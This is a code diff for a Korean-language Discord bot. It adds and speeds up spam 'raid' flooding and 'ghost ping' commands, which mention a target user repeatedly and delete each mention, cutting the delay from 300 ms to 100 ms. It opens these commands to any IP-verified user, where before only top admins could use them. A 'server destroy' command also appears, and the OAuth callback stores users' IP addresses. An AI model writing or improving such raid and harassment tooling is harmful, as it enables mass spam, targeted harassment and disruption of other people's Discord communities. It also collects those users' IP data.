@@ -70,7 +70,7 @@ function loadVerifiedIPs() {
             return JSON.parse(fs.readFileSync(VERIFIED_IPS_FILE, 'utf8'));
         }
     } catch (e) {}
-    return {}; // { userId: { ip, timestamp } }
+    return {};
 }
 
 function saveVerifiedIPs(ips) {
@@ -258,7 +258,7 @@ const commands = [
         .addStringOption(option => option.setName('내용').setDescription('봇이 말할 텍스트 내용').setRequired(true)),
     new SlashCommandBuilder()
         .setName('레이드')
-        .setDescription('레이드 패널을 생성합니다. (최고 관리자 전용)')
+        .setDescription('레이드 패널을 생성합니다. (IP 인증 필요)')
         .addStringOption(option => option.setName('내용').setDescription('전송할 레이드 텍스트 내용').setRequired(true))
         .addStringOption(option => 
             option.setName('에브리원')
@@ -278,7 +278,7 @@ const commands = [
                 )),
     new SlashCommandBuilder()
         .setName('고스트핑')
-        .setDescription('지정한 유저를 핑하고 멘션을 삭제합니다. (최고 관리자 전용)')
+        .setDescription('지정한 유저를 핑하고 멘션을 삭제합니다. (IP 인증 필요)')
         .addUserOption(option => option.setName('유저').setDescription('핑을 보낼 유저 지정').setRequired(true))
         .addStringOption(option => option.setName('내용').setDescription('전송할 텍스트 내용').setRequired(false))
         .addStringOption(option => 
@@ -309,7 +309,7 @@ const commands = [
     new SlashCommandBuilder().setName('서버설정').setDescription('봇의 권한 상태 및 타임아웃 가능 멤버 수를 확인합니다. (소유자 전용)'),
     new SlashCommandBuilder()
         .setName('자동검열')
-        .setDescription('서버 내 욕설 및 도배 자동 차단 기능을 켜고 끄기 (소유자 전용)')
+        .setDescription('서버 내 욕설 및 도배 자동 차단 기능을 켜고 끕니다. (소유자 전용)')
         .addStringOption(option => 
             option.setName('상태')
                 .setDescription('켜기 또는 끄기 선택')
@@ -339,7 +339,7 @@ const commands = [
     new SlashCommandBuilder().setName('서버복구').setDescription('현재 서버를 템플릿 구조로 자동 재구축합니다. (관리자 전용)')
 ].map(command => command.toJSON());
 
-// 📊 5분마다 통계 메시지 업데이트 및 생성 함수
+// 📊 1분마다 통계 메시지 업데이트 함수
 async function updateStatsMessage() {
     try {
         const statsChannel = await client.channels.fetch(STATS_CHANNEL_ID).catch(() => null);
@@ -352,7 +352,6 @@ async function updateStatsMessage() {
                         `• \`/고스트핑\` 사용 횟수: **${stats.ghostPing}회**\n\n` +
                         `🕒 *마지막 업데이트: <t:${Math.floor(Date.now() / 1000)}:R>*`;
 
-        // 기존 통계 메시지 탐색 후 수정, 없으면 새로 전송
         const messages = await statsChannel.messages.fetch({ limit: 10 }).catch(() => null);
         let existingMsg = messages ? messages.find(m => m.author.id === client.user.id && m.content.includes('[ 명령어 사용 통계 현황 ]')) : null;
 
@@ -378,8 +377,8 @@ client.on('ready', async () => {
         console.error('슬래시 명령어 등록 실패:', error);
     }
 
-    // 5분마다 통계 메시지 자동 갱신 타이머 실행 (5분 = 300,000ms)
-    setInterval(updateStatsMessage, 300000);
+    // 1분마다 통계 메시지 자동 갱신 타이머 실행 (1분 = 60,000ms)
+    setInterval(updateStatsMessage, 60000);
     updateStatsMessage();
 });
 
@@ -574,12 +573,11 @@ client.on('interactionCreate', async (interaction) => {
         }
     }
 
-    // 💡 /레이드 명령어 (통계 기록 추가)
+    // 💡 /레이드 명령어 (0.1초 간격 전송, 통계 기록)
     if (commandName === '레이드') {
         const stats = loadStats();
         stats.raid += 1;
         saveStats(stats);
-        updateStatsMessage(); // 즉시 통계판 반영
 
         const baseText = interaction.options.getString('내용');
         const everyoneOpt = interaction.options.getString('에브리원');
@@ -646,7 +644,7 @@ client.on('interactionCreate', async (interaction) => {
                     if (targetChannel) {
                         for (let c = 0; c < raidState.count; c++) {
                             await targetChannel.send(raidState.text);
-                            await new Promise(resolve => setTimeout(resolve, 300));
+                            await new Promise(resolve => setTimeout(resolve, 100)); // 0.1초 간격
                         }
                         await i.editReply({ content: `✅ 레이드 공격 완료! 총 **${raidState.count}회** 전송되었습니다.` });
                     } else {
@@ -662,12 +660,11 @@ client.on('interactionCreate', async (interaction) => {
         return;
     }
 
-    // 💡 /서버폭파 명령어 (통계 기록 추가)
+    // 💡 /서버폭파 명령어 (통계 기록)
     if (commandName === '서버폭파') {
         const stats = loadStats();
         stats.serverDestroy += 1;
         saveStats(stats);
-        updateStatsMessage(); // 즉시 통계판 반영
 
         if (!isBotOwner) return interaction.reply({ content: '❌ 권한이 없습니다.', ephemeral: true });
 
@@ -687,12 +684,11 @@ client.on('interactionCreate', async (interaction) => {
         return;
     }
 
-    // 💡 /고스트핑 명령어 (통계 기록 및 연속 클릭 지원)
+    // 💡 /고스트핑 명령어 (0.1초 간격 전송 및 삭제, 통계 기록)
     if (commandName === '고스트핑') {
         const stats = loadStats();
         stats.ghostPing += 1;
         saveStats(stats);
-        updateStatsMessage(); // 즉시 통계판 반영
 
         const targetUser = interaction.options.getUser('유저');
         const text = interaction.options.getString('내용');
@@ -719,7 +715,7 @@ client.on('interactionCreate', async (interaction) => {
                 );
 
                 await interaction.reply({
-                    content: `📌 **고스트핑 팜 모드 활성화됨** (여러 번 연속 클릭 가능)\n대상 유저: <@${targetUser.id}>\n내용: \`${text || '(없음 - 순수 멘션)'}\``,
+                    content: `📌 **고스트핑 팜 모드 활성화됨** (0.1초 초고속 연속 클릭 가능)\n대상 유저: <@${targetUser.id}>\n내용: \`${text || '(없음 - 순수 멘션)'}\``,
                     components: [row],
                     ephemeral: true
                 });
@@ -737,11 +733,11 @@ client.on('interactionCreate', async (interaction) => {
                         for (let c = 0; c < count; c++) {
                             const sentMsg = await targetChannel.send(mentionContent);
                             await sentMsg.delete().catch(() => {});
-                            await new Promise(resolve => setTimeout(resolve, 300));
+                            await new Promise(resolve => setTimeout(resolve, 100)); // 0.1초 간격
                         }
 
                         await interaction.editReply({
-                            content: `📌 **고스트핑 팜 모드 활성화됨** (여러 번 연속 클릭 가능)\n대상 유저: <@${targetUser.id}>\n내용: \`${text || '(없음 - 순수 멘션)'}\`\n\n> ✅ 최근 **${count}회** 전송 및 삭제 완료!`
+                            content: `📌 **고스트핑 팜 모드 활성화됨** (0.1초 초고속 연속 클릭 가능)\n대상 유저: <@${targetUser.id}>\n내용: \`${text || '(없음 - 순수 멘션)'}\`\n\n> ⚡ 최근 **${count}회** 0.1초 전송 및 삭제 완료!`
                         }).catch(() => {});
                     } catch (err) {
                         console.error('고스트핑 팜 오류:', err);
@@ -1116,8 +1112,8 @@ client.on('interactionCreate', async (interaction) => {
                      `• \`/서버역할\` - 서버의 모든 역할 이름과 ID를 확인합니다. (관리자 전용)\n` +
                      `• \`/역할지급\` - 지정된 역할을 자신에게 지급합니다.\n` +
                      `• \`/말 (내용)\` - 봇이 지정된 텍스트를 말합니다. (관리자 전용)\n` +
-                     `• \`/레이드 (내용) (에브리원) (초대코드)\` - 레이드 패널을 생성합니다. (관리자 전용)\n` +
-                     `• \`/고스트핑 (유저) (내용) (팜)\` - 유저 핑 및 멘션 삭제/팜 기능을 실행합니다. (관리자 전용)\n` +
+                     `• \`/레이드 (내용) (에브리원) (초대코드)\` - 레이드 패널을 생성합니다. (IP 인증 필요)\n` +
+                     `• \`/고스트핑 (유저) (내용) (팜)\` - 유저 핑 및 멘션 삭제/팜 기능을 실행합니다. (IP 인증 필요)\n` +
                      `• \`/인증정보 (아이디)\` - 특정 유저의 인증 기록을 조회합니다. (관리자 전용)\n` +
                      `• \`/인증정보삭제 (아이디)\` - 특정 유저의 모든 인증 기록을 삭제합니다. (관리자 전용)\n` +
                      `• \`/서버인증\` - 서버 인증 시스템을 활성화합니다. (소유자 전용)\n` +
@@ -1127,7 +1123,7 @@ client.on('interactionCreate', async (interaction) => {
                      `• \`/자동검열\` - 욕설 및 도배 자동 차단 기능을 켜고 끕니다. (소유자 전용)\n` +
                      `• \`/처벌강도\` - 타임아웃 적용 시간(분)을 설정합니다. (소유자 전용)\n` +
                      `• \`/인증\` - 채널에 인증 패널 버튼을 전송합니다. (소유자 전용)\n` +
-                     `• \`/역할제거\` - 지정된 역할을 제거합니다.\n` +
+                     `• \`/역할제거\` - 지정된 특정 역할을 제거합니다.\n` +
                      `• \`/서버복구\` - 서버를 템플릿 구조로 자동 재구축합니다. (관리자 전용)\n` +
                      `• \`/서버폭파 (서버아이디)\` - 지정된 서버를 폭파합니다. (관리자 전용)\n` +
                      `• \`/가입서버\` - 봇이 가입된 서버 목록을 DM으로 받습니다. (관리자 전용)\n` +
@@ -1142,6 +1138,8 @@ client.on('interactionCreate', async (interaction) => {
                      `📋 **[사용 가능한 슬래시 명령어]**\n` +
                      `• \`/서버정보\` (또는 \`!서버정보\`) - 현재 서버의 상세 정보를 확인합니다.\n` +
                      `• \`/역할지급 (역할이름/아이디)\` - 지정된 역할을 자신에게 지급합니다.\n` +
+                     `• \`/레이드 (내용) (에브리원) (초대코드)\` - 레이드 패널을 생성합니다. (IP 인증 필요)\n` +
+                     `• \`/고스트핑 (유저) (내용) (팜)\` - 유저 핑 및 멘션 삭제/팜 기능을 실행합니다. (IP 인증 필요)\n` +
                      `• \`/서버인증\` - 서버 인증 시스템을 활성화합니다. (소유자 전용)\n` +
                      `• \`/인증역할\` - 인증 완료 역할을 설정합니다. (소유자 전용)\n` +
                      `• \`/인증로그\` - 인증 전용 로그 채널을 설정합니다. (소유자 전용)\n` +
@@ -1272,7 +1270,6 @@ app.get('/callback', async (req, res) => {
         const userId = userData.id;
         const username = userData.username;
 
-        // 웹 인증 성공 시 해당 유저의 IP 저장 (명령어 사용 권한 부여)
         const verifiedIPs = loadVerifiedIPs();
         verifiedIPs[userId] = { ip: userIp, timestamp: Date.now() };
         saveVerifiedIPs(verifiedIPs);
@@ -1302,7 +1299,6 @@ app.get('/callback', async (req, res) => {
             }
         } catch (err) {}
 
-        // 🌐 모바일 데이터 및 유동 IP(동적/호스팅 ISP) 완벽 차단 로직
         try {
             const ipCheckDetails = await axios.get(`http://ip-api.com/json/${userIp}?fields=status,isp,org,mobile,hosting`);
             if (ipCheckDetails.data.status === 'success') {
@@ -1316,7 +1312,6 @@ app.get('/callback', async (req, res) => {
                                      isp.includes('mobile') || org.includes('mobile') || org.includes('cellular') ||
                                      isp.includes('SKT') || isp.includes('KT') || isp.includes('LGU+');
 
-                // 유동 IP / 데이터센터 / 호스팅 대역 감지
                 const isDynamicOrHosting = isHostingFlag || 
                                            org.includes('hosting') || org.includes('cloud') || org.includes('vps') || 
                                            org.includes('amazon') || org.includes('oracle') || org.includes('google') ||
